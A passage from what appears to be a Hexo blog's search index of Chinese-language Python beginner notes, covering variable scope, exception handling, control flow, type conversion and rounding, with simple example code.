代码输出为：spam</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>解释</strong>：用<code>global语句</code>来告诉python我们要在此函数内修改的<code>eggs</code>是一个全局变量，不要用这个名字创建一个局部变量。因为<code>eggs</code>在<code>spam()</code>函数的顶部被声明为<code>global</code>所以当<code>eggs</code>被赋值为<code>spam</code>时赋值发生在全局作用域的<code>eggs上</code>没有创建局部<code>eggs</code>变量。</p></li><li><p><strong>法则（判断全局变量或局部变量）</strong>：</p><p>1.如果变量在全局作用域中使用（在所有函数之外），它就是全局变量。</p><p>2.如果在一个函数中有针对该变量的<code>global语句</code>，它就是全局变量。</p><p>3.如果该变量用于函数中的赋值语句，它就是局部变量。</p><p>4.如果该变量没有用在赋值语句中，它就是全局变量。</p></li></ul><h2 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7. 异常处理"></a>7. 异常处理</h2><ul><li><p><strong>语法</strong>：使用 <code>try</code> 和 <code>except</code> 捕获异常。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spam</span>(<span class="params">divideBy</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span> / divideBy</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">12</span>))</span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：如果运行以上代码会遇到异常，因为有一个除数为0，遇到这种情况可以使用<code>try</code>和<code>except</code>语句来进行异常处理处理。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spam</span>(<span class="params">divideBy</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">42</span> / divideBy</span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error: Invalid argument.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">12</span>))        </span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">0</span>))  <span class="comment"># 输出：Error: Invalid argument. 后返回 None</span></span><br><span class="line"><span class="built_in">print</span>(spam(<span class="number">1</span>))</span><br></pre></td></tr></table></figure></li></ul><ul><li><strong>解释</strong>：我们使用<code>try</code>和<code>except</code>语句来检测代码中可能会报错的细节，但一旦跳到<code>except</code>子句的代码,就不会回到<code>try</code>的子句，而会继续向下执行。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--控制流</title>
      <link href="/2025/03/22/Python%E5%AD%A6%E4%B9%A0--%E6%8E%A7%E5%88%B6%E6%B5%81/"/>
      <url>/2025/03/22/Python%E5%AD%A6%E4%B9%A0--%E6%8E%A7%E5%88%B6%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h1 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h1><blockquote><p>[!NOTE]</p><p>以下内容部分摘录自<code>《Python编程快速上手——让繁琐的工作自动化（第二版）》</code>，并加入了一些自己的理解，仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><h2 id="1-布尔值"><a href="#1-布尔值" class="headerlink" title="1.布尔值"></a>1.布尔值</h2><ul><li>首先我们引入一个布尔值的概念，它的数据类型只有两种：<code>True</code>和<code>False</code> </li><li>像其他值一样布尔值也用在表达式中，并且可以保存在变量中。z</li></ul><h2 id="2-比较操作符"><a href="#2-比较操作符" class="headerlink" title="2.比较操作符"></a>2.比较操作符</h2><p>以下是几种比较常见的python中的比较操作符：</p><table><thead><tr><th align="center">操作符</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&#x3D;&#x3D;</td><td align="center">等于</td></tr><tr><td align="center">!&#x3D;</td><td align="center">不等于</td></tr><tr><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">&lt;&#x3D;</td><td align="center">小于等于</td></tr><tr><td align="center">&gt;&#x3D;</td><td align="center">大于等于</td></tr></tbody></table><h2 id="3-代码块"><a href="#3-代码块" class="headerlink" title="3.代码块"></a>3.代码块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;please enter your name:&#x27;</span>)</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&#x27;please enter your password:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&#x27;CYX&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hello,CYX&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Access granted&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong password&#x27;</span>)  </span><br><span class="line">       </span><br></pre></td></tr></table></figure><ul><li><p><strong>解释</strong>：首先我们用这串代码来引入代码块的概念</p><ul><li><p>代码块有三条规则：</p><p>1.缩进增加时，代码块开始。</p><p>2.代码块可以包含其他代码块。</p><p>3.缩进减少为0，或与外面包围代码块对齐代码块就结束了。</p></li></ul><p>如上述例子中，其中一个代码块开始于<code>print(&#39;Hello,CYX&#39;)</code>,并且包含之后的所有行</p></li></ul><h2 id="4-if-else-语句"><a href="#4-if-else-语句" class="headerlink" title="4. if...else 语句"></a>4. <code>if...else</code> 语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if语句的组成</span></span><br><span class="line"><span class="comment"># 1.if关键字</span></span><br><span class="line"><span class="comment"># 2.条件（求值为True或False的表达式）</span></span><br><span class="line"><span class="comment"># 3.冒号（：）</span></span><br><span class="line"><span class="comment"># 4.在下一行开始，缩进的代码块（if的子句）</span></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;please enter your name:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&#x27;CYX&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello &#x27;</span> + name)</span><br><span class="line"><span class="comment"># else语句的组成</span></span><br><span class="line"><span class="comment"># 1.else关键字</span></span><br><span class="line"><span class="comment"># 2.冒号（：）</span></span><br><span class="line"><span class="comment"># 3.在下一行开始，缩进的代码块（else的子句）</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello stranger!&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>if...else</code> 语句用于条件判断。如果条件满足执行 <code>if</code> 语句块，否则执行 <code>else</code> 语句块。</li></ul><h2 id="5-elif-语句"><a href="#5-elif-语句" class="headerlink" title="5. elif 语句"></a>5. <code>elif</code> 语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># elif语句的使用，与C语言中的else if语句类似</span></span><br><span class="line"><span class="comment"># elif语句的组成：</span></span><br><span class="line"><span class="comment"># 1.elif关键字</span></span><br><span class="line"><span class="comment"># 2.条件（求值为True或False的表达式）</span></span><br><span class="line"><span class="comment"># 3.冒号（：）</span></span><br><span class="line"><span class="comment"># 4.在下一行开始，缩进的代码块（elif的子句）</span></span><br><span class="line">name = <span class="string">&#x27;KKK&#x27;</span></span><br><span class="line">age = <span class="number">3000</span></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&#x27;CYX&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Hi CYX&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> age &lt; <span class="number">12</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;you are not CYX, kiddo&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> age &gt; <span class="number">2000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Unlike you, CYX is not an undead, immortal vampire&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> age &gt; <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;you are not CYX, grannie&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>elif</code> 是 <code>else if</code> 的缩写，可以用于多个条件判断。程序依次检查每个条件，直到有条件满足。</li></ul><h2 id="6-while-循环"><a href="#6-while-循环" class="headerlink" title="6. while 循环"></a>6. <code>while</code> 循环</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># while循环语句的组成</span></span><br><span class="line"><span class="comment"># 1.while关键字</span></span><br><span class="line"><span class="comment"># 2.条件（求值为True或False的表达式）</span></span><br><span class="line"><span class="comment"># 3.冒号</span></span><br><span class="line"><span class="comment"># 4.while的子句</span></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;please enter your name:&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> name != <span class="string">&#x27;CYX&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WRONG!!&#x27;</span>)</span><br><span class="line">    name = <span class="built_in">input</span>(<span class="string">&#x27;please enter your name, again:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;RIGHT!&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>while</code> 循环会不断执行，直到条件不再满足。在此例中，程序会不断要求用户输入正确的名字，直到输入 <code>&#39;CYX&#39;</code> 为止。</li></ul><h2 id="7-break-语句"><a href="#7-break-语句" class="headerlink" title="7. break 语句"></a>7. <code>break</code> 语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># break是一个捷径，可以让你提前跳出while的子句。遇到break语句就会马上退出while的子句</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;please enter your name:&#x27;</span>)</span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&#x27;CYX&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Thank you!&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>break</code> 语句可以让程序提前退出循环。在这个例子中，当输入为 <code>&#39;CYX&#39;</code> 时，<code>break</code> 会终止 <code>while</code> 循环。</li></ul><h2 id="8-continue-语句"><a href="#8-continue-语句" class="headerlink" title="8. continue 语句"></a>8. <code>continue</code> 语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># continue语句用于循环内部。当程序执行遇到continue语句就会马上跳回到循环开始，重新对循环条件求值</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Who are you?&#x27;</span>)</span><br><span class="line">    name = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&#x27;CYX&#x27;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello, CYX. What is the password?&#x27;</span>)</span><br><span class="line">    password = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;access granted&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>continue</code> 语句会跳过当前循环的剩余部分，直接进行下一次循环。在此例中，只有输入 <code>&#39;CYX&#39;</code> 时，才会继续执行后续的代码。</li></ul><h2 id="9-for-循环与-range-函数"><a href="#9-for-循环与-range-函数" class="headerlink" title="9.for 循环与 range() 函数"></a>9.<code>for</code> 循环与 <code>range()</code> 函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在条件为True时while循环会执行，如果想让代码块执行固定的次数，可以通过for循环和range()函数来实现</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;My name is&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Jimmy Five Times (&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>for</code> 循环与 <code>range()</code> 函数结合使用，<code>range(5)</code> 生成从 0 到 4 的整数序列，用于循环固定次数。以下是一个<code>for</code>循环的例子：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> + i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>for</code> 循环用于迭代指定的范围。在此例中，计算从 0 到 100 所有整数的和。</li></ul><h2 id="10-range-函数"><a href="#10-range-函数" class="headerlink" title="10. range() 函数"></a>10. <code>range()</code> 函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment">#第一个参数是for循环变量开始的值 第二个参数是上限但不包括他</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment">#range函数也可以有第三个值 分别是起始值 终止值 和 步长</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment">#range函数也可以用负数作为步长让循环计数逐渐减少</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>range()</code> 函数用于生成指定范围的数字序列，支持起始值、结束值和步长的设置。可以用来控制循环的起始值、终止值及步进。</li></ul><h2 id="11-导入模块"><a href="#11-导入模块" class="headerlink" title="11. 导入模块"></a>11. 导入模块</h2><ul><li><p>python可以调用一组基本的函数，成为内置函数（如 <code>print()</code>，<code>input()</code>，<code>len()</code>）。</p></li><li><p>python也包括一组模块，称为“标准库”每个模块都是一个python程序，包含一组相关的函数，可以嵌入你程序中,例如:<code>math</code>有与数学相关的函数,，<code>random</code>有与随机数相关的函数</p></li><li><p><code>import</code>用来导入这些函数，他的组成部分为：</p><p>1.<code>import</code>关键字 </p><p>2.模块的名称 </p><p>3.可选的更多模块的名称 至今用逗号隔开</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入random模块，并使用random.randint()生成随机数</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(random.randint(<span class="number">1</span>, <span class="number">10</span>))</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>import</code> 用于导入外部模块，例如 <code>random</code> 模块。此示例中使用 <code>random.randint()</code> 生成一个范围在 1 到 10 之间的随机整数。</li></ul><p><code>form import</code> 包括<code>form</code>关键字<code>板块名称</code>和<code>import</code>关键字和一个星号<code>*</code>，这种形式的<code>import</code>语句调用如<code>random</code>模板中的函数时不需要<code>random. </code>前缀</p><h2 id="12-sys-exit-函数提前结束程序"><a href="#12-sys-exit-函数提前结束程序" class="headerlink" title="12. sys.exit() 函数提前结束程序"></a>12. <code>sys.exit()</code> 函数提前结束程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当程序执行到指令底部时总是会终止，但是调用sys.exit()函数可以让程序提前终止或退出</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Type exit to exit.&#x27;</span>)</span><br><span class="line">    response = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You typed &#x27;</span> + response + <span class="string">&#x27;.&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>sys.exit()</code> 用于终止程序的执行。当用户输入 <code>&#39;exit&#39;</code> 时，程序会提前退出。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--基础</title>
      <link href="/2025/03/21/Python%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/03/21/Python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Python基础"><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h1><blockquote><p>[!NOTE]</p><p>以下内容部分摘录自<code>《Python编程快速上手——让繁琐的工作自动化（第二版）》</code>，并加入了一些自己的理解，仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><h2 id="1-第一个Python程序"><a href="#1-第一个Python程序" class="headerlink" title="1. 第一个Python程序"></a>1. 第一个Python程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这个程序打印问候并询问我的名字</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Hello world!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myName = <span class="built_in">input</span>(<span class="string">&#x27;Your name is:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;It is good to meet you,&#x27;</span> + myName)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The length of your name is:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(myName))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;What is your age?&#x27;</span>)</span><br><span class="line">myAge = <span class="built_in">input</span>(<span class="string">&#x27;Your age is:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you will be &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(myAge) + <span class="number">1</span>) + <span class="string">&#x27; in a year&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：这是一个简单的程序，打印问候语，询问用户的名字，并计算名字的长度。还询问用户的年龄，并预测他们明年的年龄。</li></ul><h2 id="2-整数和浮点数的转换"><a href="#2-整数和浮点数的转换" class="headerlink" title="2. 整数和浮点数的转换"></a>2. 整数和浮点数的转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(-<span class="number">3.14</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="string">&#x27;42&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="number">42</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="string">&#x27;-99&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(-<span class="number">99</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(<span class="string">&#x27;3.14&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(<span class="number">3.14</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(<span class="string">&#x27;10&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：这段代码展示了不同类型之间的转换：<ul><li><code>str()</code>：将数字转换为字符串。</li><li><code>int()</code>：将字符串和数字转换为整数。</li><li><code>float()</code>：将字符串和数字转换为浮动点数。</li><li>注意：<code>int(1.25)</code>是有效的，但<code>int(&#39;1.25&#39;)</code>会报错，因为它要求字符串为整数。</li></ul></li></ul><h2 id="3-获取字符串的长度"><a href="#3-获取字符串的长度" class="headerlink" title="3. 获取字符串的长度"></a>3. 获取字符串的长度</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;aaa&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>len()</code>函数返回字符串的长度。在这个例子中，字符串<code>&#39;aaa&#39;</code>有3个字符。</li></ul><h2 id="4-四舍五入函数-round"><a href="#4-四舍五入函数-round" class="headerlink" title="4. 四舍五入函数 round()"></a>4. 四舍五入函数 <code>round()</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">round</span>(<span class="number">1.4</span>), <span class="built_in">round</span>(<span class="number">1.6</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">round</span>(<span class="number">1.23456</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">round</span>(<span class="number">2.5</span>), <span class="built_in">round</span>(<span class="number">3.5</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">round</span>(-<span class="number">1.2</span>), <span class="built_in">round</span>(-<span class="number">3.8</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">round</span>(<span class="number">0.1</span> + <span class="number">0.2</span>, <span class="number">1</span>))</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：<code>round()</code>函数用于四舍五入数字到最接近的整数或指定的小数位数。 <ul><li><strong>银行家舍入法</strong>：当数字后面是<code>.5</code>时，Python会将其舍入到最接近的偶数（例如，<code>round(2.5)</code> → <code>2</code>，<code>round(3.5)</code> → <code>4</code>）。</li><li><strong>处理浮点数精度问题</strong>：<code>round(0.1 + 0.2, 1)</code>可以修正浮点数计算中的误差，得到更精确的结果。</li></ul></li></ul><h2 id="5-使用-str-进行字符串拼接"><a href="#5-使用-str-进行字符串拼接" class="headerlink" title="5. 使用 str() 进行字符串拼接"></a>5. 使用 <code>str()</code> 进行字符串拼接</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;I am &#x27;</span> + <span class="built_in">str</span>(<span class="number">29</span>) + <span class="string">&#x27; years old&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>解释</strong>：在Python中，不能直接将字符串与整数进行拼接。要将整数与字符串拼接，需要使用<code>str()</code>函数将整数转换为字符串。</li></ul><h2 id="其他注意事项："><a href="#其他注意事项：" class="headerlink" title="其他注意事项："></a>其他注意事项：</h2><ul><li><strong>第一个Python程序</strong>：可以使用<code>input()</code>来获取用户输入。然而，需要将输入转换为正确的类型（例如，对于数字输入使用<code>int()</code>）。</li><li><strong>类型转换</strong>：Python提供了一些函数，如<code>str()</code>、<code>int()</code>和<code>float()</code>，用于在整数、浮动点数和字符串之间进行类型转换。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MosHSasA</title>
      <link href="/2025/03/19/%E6%B5%8B%E8%AF%95/"/>
      <url>/2025/03/19/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2>]]></content>
      
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
